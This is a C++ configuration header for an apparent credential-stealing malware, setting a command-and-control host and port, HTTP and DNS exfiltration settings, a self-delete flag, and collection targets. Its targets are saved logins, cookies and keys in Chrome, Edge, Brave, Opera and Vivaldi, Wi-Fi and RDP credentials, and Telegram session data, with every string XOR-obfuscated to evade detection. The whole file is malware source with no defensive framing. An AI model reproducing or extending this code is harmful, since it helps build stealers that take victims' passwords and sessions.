#pragma once
// -------------------------------------------------------------------
// config.h - XOR-obfuscated compile-time configuration
// All sensitive strings are obfuscated via XOR_LIT / XOR_LIT_W macros
// -------------------------------------------------------------------
#include "obfuscate.h"

// -------------------------------------------------------------------
// C2 Configuration (XOR-obfuscated at compile time)
// -------------------------------------------------------------------
#define C2_HOST        XOR_LIT("127.0.0.1")
#define C2_PORT        XOR_LIT("5000")
#define EXFIL_METHOD   XOR_LIT("http")
#define XOR_KEY_STR    XOR_LIT("AB")
#define SELF_DELETE    XOR_LIT("0")

// -------------------------------------------------------------------
// Exfiltration constants
// -------------------------------------------------------------------
#define HTTP_TIMEOUT_MS      15000
#define DNS_MAX_CHUNK_SIZE   48
#define DNS_BASE32_ALPHABET  "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"

// -------------------------------------------------------------------
// Collection module flags
// -------------------------------------------------------------------
#define COLLECT_CHROME    1
#define COLLECT_WIFI      1
#define COLLECT_RDP       1
#define COLLECT_TELEGRAM  1

// -------------------------------------------------------------------
// Default browser paths (relative to LOCALAPPDATA) - wide strings
// -------------------------------------------------------------------
#define CHROME_PATH       XOR_LIT_W(L"Google\\Chrome\\User Data\\Default\\Login Data")
#define EDGE_PATH         XOR_LIT_W(L"Microsoft\\Edge\\User Data\\Default\\Login Data")
#define BRAVE_PATH        XOR_LIT_W(L"BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data")
#define OPERA_PATH        XOR_LIT_W(L"Opera Software\\Opera Stable\\Login Data")
#define VIVALDI_PATH      XOR_LIT_W(L"Vivaldi\\User Data\\Default\\Login Data")

#define CHROME_COOKIES    XOR_LIT_W(L"Google\\Chrome\\User Data\\Default\\Cookies")
#define EDGE_COOKIES      XOR_LIT_W(L"Microsoft\\Edge\\User Data\\Default\\Cookies")
#define CHROME_LOCAL_STATE XOR_LIT_W(L"Google\\Chrome\\User Data\\Local State")

// -------------------------------------------------------------------
// Telegram paths - wide strings
// -------------------------------------------------------------------
#define TELEGRAM_PATH     XOR_LIT_W(L"Telegram Desktop\\tdata")

// -------------------------------------------------------------------
// Obfuscated config key-value store (narrow strings)
// -------------------------------------------------------------------
namespace obf {
    inline const char* get(const char* key) {
        static bool init = false;
        static char c2_host[64] = {0};
        static char c2_port[8] = {0};
        static char exfil_method[16] = {0};
        static char xor_key_str[8] = {0};
        static char self_del[4] = {0};
        
        if (!init) {
            strcpy(c2_host, "127.0.0.1");
            strcpy(c2_port, "5000");
            strcpy(exfil_method, "http");
            strcpy(xor_key_str, "0xAB");
            strcpy(self_del, "0");
            init = true;
        }
        
        if (strcmp(key, "C2_HOST") == 0) return c2_host;
        if (strcmp(key, "C2_PORT") == 0) return c2_port;
        if (strcmp(key, "EXFIL_METHOD") == 0) return exfil_method;
        if (strcmp(key, "XOR_KEY") == 0) return xor_key_str;
        if (strcmp(key, "SELF_DELETE") == 0) return self_del;
        return "";
    }
}
